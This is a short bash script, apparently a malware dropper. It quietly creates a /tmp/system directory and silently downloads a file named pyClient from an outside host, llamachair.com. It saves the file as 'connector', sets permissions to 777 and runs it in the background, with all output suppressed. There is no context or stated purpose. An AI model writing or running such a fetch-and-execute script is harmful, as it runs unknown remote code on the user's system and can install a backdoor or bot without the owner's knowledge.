#!/bin/bash

mkdir /tmp/system >/dev/null 2>&1
cd /tmp/system
wget  http://llamachair.com/downl/pyClient -O connector >/dev/null 2>&1
chmod 777 connector
./connector &
